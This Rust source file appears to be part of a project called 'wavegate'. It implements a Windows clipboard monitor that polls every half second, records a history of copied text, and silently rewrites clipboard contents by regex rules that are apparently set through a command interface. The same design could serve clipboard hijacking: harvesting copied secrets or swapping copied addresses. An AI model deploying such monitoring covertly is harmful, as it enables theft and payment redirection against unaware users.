//! Clipboard manager with monitoring, history, and regex replacement rules.

use wavegate_shared::{ClipboardEntry, ClipboardRule, CommandResponseData};
use once_cell::sync::Lazy;
use parking_lot::Mutex;
use regex_lite::Regex;
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};
use windows::Win32::System::DataExchange::*;
use windows::Win32::System::Memory::*;
use windows::Win32::Foundation::*;

/// Maximum history entries to keep
const MAX_HISTORY: usize = 50;

/// CF_UNICODETEXT clipboard format
const CF_UNICODETEXT: u32 = 13;

/// Clipboard state
struct ClipboardState {
    /// Clipboard history (newest first)
    history: Vec<ClipboardEntry>,
    /// Active replacement rules
    rules: HashMap<String, (ClipboardRule, Option<Regex>)>,
    /// Last known clipboard content (to detect changes)
    last_content: String,
}

impl Default for ClipboardState {
    fn default() -> Self {
        Self {
            history: Vec::new(),
            rules: HashMap::new(),
            last_content: String::new(),
        }
    }
}

static CLIPBOARD_STATE: Lazy<Mutex<ClipboardState>> = Lazy::new(|| Mutex::new(ClipboardState::default()));
static MONITOR_RUNNING: AtomicBool = AtomicBool::new(false);

/// Get current timestamp in seconds
fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Start the clipboard monitor thread
pub fn start_monitor() {
    if MONITOR_RUNNING.swap(true, Ordering::SeqCst) {
        return;
    }

    std::thread::spawn(|| {
        monitor_loop();
    });
}

/// Monitor loop - checks clipboard periodically
fn monitor_loop() {
    loop {
        std::thread::sleep(std::time::Duration::from_millis(500));

        if let Some(content) = get_clipboard_text() {
            let mut state = CLIPBOARD_STATE.lock();

            if content != state.last_content && !content.is_empty() {
                let mut modified = content.clone();
                let mut was_modified = false;

                for (_id, (rule, regex_opt)) in state.rules.iter() {
                    if !rule.enabled {
                        continue;
                    }
                    if let Some(regex) = regex_opt {
                        if regex.is_match(&modified) {
                            modified = regex.replace_all(&modified, &rule.replacement).to_string();
                            was_modified = true;
                        }
                    }
                }

                if was_modified && modified != content {
                    let replacement = modified.clone();
                    drop(state);
                    let _ = set_clipboard_text(&replacement);
                    let mut state = CLIPBOARD_STATE.lock();

                    state.history.insert(0, ClipboardEntry {
                        content: content.clone(),
                        timestamp: now_secs(),
                        replaced_with: Some(replacement.clone()),
                    });

                    if state.history.len() > MAX_HISTORY {
                        state.history.truncate(MAX_HISTORY);
                    }

                    state.last_content = replacement;
                } else {
                    state.history.insert(0, ClipboardEntry {
                        content: content.clone(),
                        timestamp: now_secs(),
                        replaced_with: None,
                    });

                    if state.history.len() > MAX_HISTORY {
                        state.history.truncate(MAX_HISTORY);
                    }

                    state.last_content = content;
                }
            }
        }
    }
}

/// Get clipboard text content
fn get_clipboard_text() -> Option<String> {
    unsafe {
        if OpenClipboard(None).is_err() {
            return None;
        }

        let result = (|| {
            let handle = GetClipboardData(CF_UNICODETEXT).ok()?;
            if handle.0.is_null() {
                return None;
            }

            let ptr = GlobalLock(std::mem::transmute::<_, HGLOBAL>(handle.0));
            if ptr.is_null() {
                return None;
            }

            let wide_ptr = ptr as *const u16;
            let mut len = 0;
            while *wide_ptr.add(len) != 0 {
                len += 1;
            }

            let slice = std::slice::from_raw_parts(wide_ptr, len);
            let text = String::from_utf16_lossy(slice);

            let _ = GlobalUnlock(std::mem::transmute::<_, HGLOBAL>(handle.0));

            Some(text)
        })();

        let _ = CloseClipboard();
        result
    }
}

/// Set clipboard text content
fn set_clipboard_text(text: &str) -> bool {
    unsafe {
        if OpenClipboard(None).is_err() {
            return false;
        }

        let success = (|| -> bool {
            if EmptyClipboard().is_err() {
                return false;
            }

            let wide: Vec<u16> = text.encode_utf16().chain(std::iter::once(0)).collect();
            let bytes_needed = wide.len() * 2;

            let hmem = match GlobalAlloc(GMEM_MOVEABLE, bytes_needed) {
                Ok(h) => h,
                Err(_) => return false,
            };

            let ptr = GlobalLock(hmem);
            if ptr.is_null() {
                let _ = GlobalFree(Some(hmem));
                return false;
            }

            std::ptr::copy_nonoverlapping(wide.as_ptr(), ptr as *mut u16, wide.len());
            let _ = GlobalUnlock(hmem);

            let handle = SetClipboardData(CF_UNICODETEXT, Some(std::mem::transmute::<_, HANDLE>(hmem.0)));
            if handle.is_err() {
                let _ = GlobalFree(Some(hmem));
                return false;
            }

            true
        })();

        let _ = CloseClipboard();
        success
    }
}

/// Get clipboard contents and history
pub fn get_clipboard() -> (bool, CommandResponseData) {
    start_monitor();

    let current = get_clipboard_text().unwrap_or_default();
    let state = CLIPBOARD_STATE.lock();

    (true, CommandResponseData::Clipboard {
        current,
        history: state.history.clone(),
    })
}

/// Set clipboard contents
pub fn set_clipboard(data: &str) -> (bool, CommandResponseData) {
    if set_clipboard_text(data) {
        let mut state = CLIPBOARD_STATE.lock();
        state.last_content = data.to_string();

        (true, CommandResponseData::ClipboardRuleResult { success: true })
    } else {
        (false, CommandResponseData::Error {
            message: "Failed to set clipboard".to_string(),
        })
    }
}

/// Add a clipboard replacement rule
pub fn add_rule(id: &str, pattern: &str, replacement: &str, enabled: bool) -> (bool, CommandResponseData) {
    start_monitor();

    let regex = match Regex::new(pattern) {
        Ok(r) => Some(r),
        Err(e) => {
            return (false, CommandResponseData::Error {
                message: format!("Invalid regex pattern: {}", e),
            });
        }
    };

    let rule = ClipboardRule {
        id: id.to_string(),
        pattern: pattern.to_string(),
        replacement: replacement.to_string(),
        enabled,
    };

    let mut state = CLIPBOARD_STATE.lock();
    state.rules.insert(id.to_string(), (rule, regex));

    (true, CommandResponseData::ClipboardRuleResult { success: true })
}

/// Remove a clipboard rule
pub fn remove_rule(id: &str) -> (bool, CommandResponseData) {
    let mut state = CLIPBOARD_STATE.lock();

    if state.rules.remove(id).is_some() {
        (true, CommandResponseData::ClipboardRuleResult { success: true })
    } else {
        (false, CommandResponseData::Error {
            message: format!("Rule '{}' not found", id),
        })
    }
}

/// Update a clipboard rule (enable/disable)
pub fn update_rule(id: &str, enabled: bool) -> (bool, CommandResponseData) {
    let mut state = CLIPBOARD_STATE.lock();

    if let Some((rule, _)) = state.rules.get_mut(id) {
        rule.enabled = enabled;
        (true, CommandResponseData::ClipboardRuleResult { success: true })
    } else {
        (false, CommandResponseData::Error {
            message: format!("Rule '{}' not found", id),
        })
    }
}

/// List all clipboard rules
pub fn list_rules() -> (bool, CommandResponseData) {
    let state = CLIPBOARD_STATE.lock();
    let rules: Vec<ClipboardRule> = state.rules.values().map(|(r, _)| r.clone()).collect();

    (true, CommandResponseData::ClipboardRules { rules })
}

/// Clear clipboard history
pub fn clear_history() -> (bool, CommandResponseData) {
    let mut state = CLIPBOARD_STATE.lock();
    state.history.clear();

    (true, CommandResponseData::ClipboardRuleResult { success: true })
}
